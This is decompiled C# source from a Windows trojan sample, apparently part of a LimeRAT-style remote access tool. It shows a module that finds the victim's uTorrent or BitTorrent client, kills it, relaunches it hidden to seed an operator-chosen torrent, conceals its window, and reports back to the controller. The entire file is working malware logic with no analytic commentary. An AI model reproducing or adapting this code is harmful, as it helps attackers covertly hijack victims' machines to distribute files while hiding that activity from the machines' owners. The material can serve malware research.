// Decompiled with JetBrains decompiler
// Type: Torrent
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

[StandardModule]
internal sealed class Torrent
{
  public static string UTorrentLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\uTorrent\\uTorrent.exe";
  public static string BitLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BitTorrent\\BitTorrent.exe";

  [DllImport("user32.dll")]
  private static extern int ShowWindow(int hwnd, int nCmdShow);

  public static void SeedTorrent(string path)
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      if (!Torrent.IsBitTorrent())
        goto label_6;
label_4:
      num3 = 3;
      Torrent.SeedIt(Torrent.BitLocalPath, Torrent.BitLocalPath, path);
label_5:
      num3 = 4;
      Core.Send("MSG" + Core.Y + "Seeding with BitTorrent");
      goto label_17;
label_6:
      num3 = 6;
      if (!Torrent.IsUtorrent())
        goto label_9;
label_7:
      num3 = 7;
      Torrent.SeedIt(Torrent.UTorrentLocalPath, Torrent.UTorrentLocalPath, path);
label_8:
      num3 = 8;
      Core.Send("MSG" + Core.Y + "Seeding with uTorrent");
      goto label_17;
label_9:
      num3 = 10;
      Core.Send("MSG" + Core.Y + "No Torrent Software Installed");
label_10:
      goto label_17;
label_12:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
            case 9:
            case 12:
              goto label_17;
            case 6:
              goto label_6;
            case 7:
              goto label_7;
            case 8:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_12;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_17:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static string GetFileNameFromURL(string URL)
  {
    string fileNameFromUrl;
    try
    {
      fileNameFromUrl = URL.Substring(checked (URL.LastIndexOf("/", StringComparison.Ordinal) + 1));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      fileNameFromUrl = URL;
      ProjectData.ClearProjectError();
    }
    return fileNameFromUrl;
  }

  public static bool IsUtorrent()
  {
    int num1;
    bool flag;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      if (!File.Exists(Torrent.UTorrentLocalPath))
        goto label_5;
label_4:
      num3 = 3;
      flag = true;
      goto label_12;
label_5:
label_6:
      num3 = 5;
      flag = false;
      goto label_12;
label_8:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_6;
            case 6:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_8;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    if (num2 != 0)
      ProjectData.ClearProjectError();
    return flag;
  }

  public static bool IsBitTorrent() => File.Exists(Torrent.BitLocalPath);

  public static void SeedIt(string ClientPath, string LocalPath, string TorrentPath)
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      ProcessStartInfo startInfo = new ProcessStartInfo();
label_4:
      num3 = 3;
      startInfo.FileName = ClientPath;
label_5:
      num3 = 4;
      startInfo.Arguments = "/" + LocalPath + " \"" + TorrentPath + "\"";
label_6:
      num3 = 5;
      startInfo.CreateNoWindow = true;
label_7:
      num3 = 6;
      startInfo.WindowStyle = ProcessWindowStyle.Hidden;
label_8:
      num3 = 7;
      startInfo.ErrorDialog = false;
label_9:
      num3 = 8;
      Process.GetProcessesByName("BitTorrent")[0].Kill();
label_10:
      num3 = 9;
      Process.GetProcessesByName("uTorrent")[0].Kill();
label_11:
      num3 = 10;
      Process.Start(startInfo);
label_12:
      num3 = 11;
      if (!ClientPath.Contains("uTorrent"))
        goto label_14;
label_13:
      num3 = 12;
      Torrent.HideIt("uTorrent");
      goto label_23;
label_14:
      num3 = 14;
      if (!ClientPath.Contains("BitTorrent"))
        goto label_23;
label_15:
      num3 = 15;
      Torrent.HideIt("BitTorrent");
label_16:
      goto label_23;
label_18:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_6;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_9;
            case 9:
              goto label_10;
            case 10:
              goto label_11;
            case 11:
              goto label_12;
            case 12:
              goto label_13;
            case 13:
            case 17:
              goto label_23;
            case 14:
              goto label_14;
            case 15:
              goto label_15;
            case 16:
              goto label_16;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_18;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_23:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static void HideIt(string TorrentClient)
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      Thread.Sleep(1000);
label_4:
      num3 = 3;
      Process[] processesByName = Process.GetProcessesByName(TorrentClient);
label_5:
      num3 = 4;
      Torrent.ShowWindow(processesByName[0].MainWindowHandle.ToInt32(), 0);
      goto label_12;
label_7:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_7;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }
}
